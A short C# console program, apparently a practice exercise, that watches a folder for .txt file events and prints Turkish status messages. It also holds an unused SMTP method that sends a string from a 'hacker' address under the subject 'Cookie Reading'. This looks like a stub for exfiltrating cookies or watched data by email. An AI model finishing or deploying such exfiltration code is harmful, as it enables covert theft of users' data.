using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace ConFileSystemWatcher
{
    class Program
    {
        static FileSystemWatcher izle;
        static void Main(string[] args)
        {
            izle = new FileSystemWatcher();
            izle.Path = "C:\\Deneme";
            izle.Filter = "*.txt";
            izle.NotifyFilter = NotifyFilters.Size | NotifyFilters.FileName;


            izle.Renamed += İzle_Renamed;
            izle.Changed += İzle_Changed;
            izle.Created += İzle_Created;
            izle.Deleted += İzle_Deleted;

            izle.EnableRaisingEvents = true;

            Console.ReadKey();

        }

        private static void İzle_Deleted(object sender, FileSystemEventArgs e)
        {
            Console.WriteLine("Birşeyler Silindi");
        }

        private static void İzle_Created(object sender, FileSystemEventArgs e)
        {
            Console.WriteLine("Dosya Oluşturuldu");
        }

        private static void İzle_Changed(object sender, FileSystemEventArgs e)
        {
            Console.WriteLine("Dosya Değişti");
        }

        private static void İzle_Renamed(object sender, RenamedEventArgs e)
        {
            Console.WriteLine("Dosya adı değişti");
        }

        public static void MailGonder(string deger)
        {
            SmtpClient sc = new SmtpClient();
            sc.Port = 587;
            sc.Host = "smtp.live.com";
            sc.EnableSsl = true;
            sc.Timeout = 50000;
            sc.Credentials = new NetworkCredential("hacker@hekır.com", "123");
            MailMessage mail = new MailMessage();
            mail.From = new MailAddress("hacker@hekır.com", "123");
            mail.To.Add("to mail");
            mail.CC.Add("cc mail");

            mail.Subject = "Cookie Okuma";
            mail.IsBodyHtml = true;
            mail.Body = deger;
            sc.Send(mail);
        }
    }
}
